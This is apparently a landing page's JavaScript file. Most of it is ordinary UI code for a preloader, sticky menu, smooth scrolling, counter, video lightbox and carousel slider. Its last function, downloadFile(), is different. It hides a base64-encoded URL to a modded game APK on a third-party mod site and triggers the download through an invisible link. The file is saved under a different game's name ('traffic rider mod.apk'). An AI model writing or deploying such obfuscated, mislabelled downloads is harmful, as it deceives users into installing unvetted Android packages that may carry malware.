(function () {
  "use strict";

  //===== Preloader

  window.onload = function () {
    window.setTimeout(fadeout, 500);
  };

  function fadeout() {
    document.querySelector(".preloader").style.opacity = "0";
    document.querySelector(".preloader").style.display = "none";
  }

  // ==== Sticky Menu
  window.onscroll = function () {
    const header_navbar = document.getElementById("header_navbar");
    const sticky = header_navbar.offsetTop;

    if (window.pageYOffset > sticky) {
      header_navbar.classList.add("sticky");
    } else {
      header_navbar.classList.remove("sticky");
    }

    // show or hide the back-top-top button
    const backToTo = document.querySelector(".back-to-top");
    if (
      document.body.scrollTop > 50 ||
      document.documentElement.scrollTop > 50
    ) {
      backToTo.style.display = "block";
    } else {
      backToTo.style.display = "none";
    }
  };

  // for menu scroll
  const pageLink = document.querySelectorAll(".page-scroll");

  pageLink.forEach((elem) => {
    elem.addEventListener("click", (e) => {
      e.preventDefault();
      document.querySelector(elem.getAttribute("href")).scrollIntoView({
        behavior: "smooth",
        offsetTop: 1 - 60,
      });
    });
  });

  // section menu active
  function onScroll(event) {
    const sections = document.querySelectorAll(".page-scroll");
    const scrollPos =
      window.pageYOffset ||
      document.documentElement.scrollTop ||
      document.body.scrollTop;

    for (let i = 0; i < sections.length; i++) {
      const currLink = sections[i];
      const val = currLink.getAttribute("href");
      const refElement = document.querySelector(val);
      const scrollTopMinus = scrollPos + 73;
      if (
        refElement.offsetTop <= scrollTopMinus &&
        refElement.offsetTop + refElement.offsetHeight > scrollTopMinus
      ) {
        document.querySelector(".page-scroll").classList.remove("active");
        currLink.classList.add("active");
      } else {
        currLink.classList.remove("active");
      }
    }
  }

  window.document.addEventListener("scroll", onScroll);

  //===== close navbar-collapse when a  clicked
  let navbarToggler = document.querySelector(".navbar-toggler");
  const navbarCollapse = document.querySelector(".navbar-collapse");

  document.querySelectorAll(".page-scroll").forEach((e) =>
    e.addEventListener("click", () => {
      navbarToggler.classList.remove("active");
      navbarCollapse.classList.remove("show");
    })
  );
  navbarToggler.addEventListener("click", function () {
    navbarToggler.classList.toggle("active");
  });

  //====== counter up
  const cu = new counterUp({
    start: 0,
    duration: 2000,
    intvalues: true,
    interval: 100,
    append: "k",
  });
  cu.start();

  //========= glightbox
  GLightbox({
    selector: ".glightbox",
    href: "https://www.youtube.com/embed/7IqSWyq74wY",
    type: "video",
    source: "youtube", //vimeo, youtube or local
    width: 900,
    autoplayVideos: true,
  });

  //WOW Scroll Spy
  const wow = new WOW({
    //disabled for mobile
    mobile: false,
  });
  wow.init();
})();


// JavaScript code for the slider

// Get the slider elements
var slider = document.getElementById("slider");
var sliderItems = slider.getElementsByClassName("carousel-item");
var sliderCaptions = slider.getElementsByClassName("carousel-caption");

// Initialize the current slide index
var currentSlide = 0;

// Function to show the current slide
function showSlide() {
  // Hide all slides and captions
  for (var i = 0; i < sliderItems.length; i++) {
    sliderItems[i].classList.remove("active");
    sliderCaptions[i].style.opacity = "1";
  }

  // Show the current slide and caption
  sliderItems[currentSlide].classList.add("active");
  sliderCaptions[currentSlide].style.opacity = "1";
}

// Function to move to the next slide
function nextSlide() {
  currentSlide++;
  if (currentSlide >= sliderItems.length) {
    currentSlide = 0;
  }
  showSlide();
}

// Function to move to the previous slide
function prevSlide() {
  currentSlide--;
  if (currentSlide < 0) {
    currentSlide = sliderItems.length - 1;
  }
  showSlide();
}

// Show the initial slide
showSlide();

// Set interval to automatically move to the next slide every 5 seconds
var slideInterval = setInterval(nextSlide, 5000);

// Handle slide change when user clicks on next/previous controls
slider.addEventListener("click", function (event) {
  var target = event.target;
  if (target.classList.contains("carousel-control-next") || target.classList.contains("carousel-control-prev")) {
    clearInterval(slideInterval);
    slideInterval = setInterval(nextSlide, 5000);
    var direction = target.getAttribute("data-bs-slide");
    if (direction === "prev") {
      prevSlide();
    } else if (direction === "next") {
      nextSlide();
    }
  }
});

function downloadFile() {
      // Encoded download link
      var encodedUrl = "aHR0cHM6Ly9maWxlcy5raW5nbW9kYXBrLm5ldC9nYW1lcy9kb29kbGUtYXJteS0yLW1vZF81LjQuMi1raW5nbW9kYXBrLm5ldC5hcGs=";
    
      // Decode the URL
      var decodedUrl = atob(encodedUrl);
    
      // Create an invisible link and trigger the download
      var link = document.createElement("a");
      link.style.display = "none";
      link.href = decodedUrl;
      link.download = "traffic rider mod.apk";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }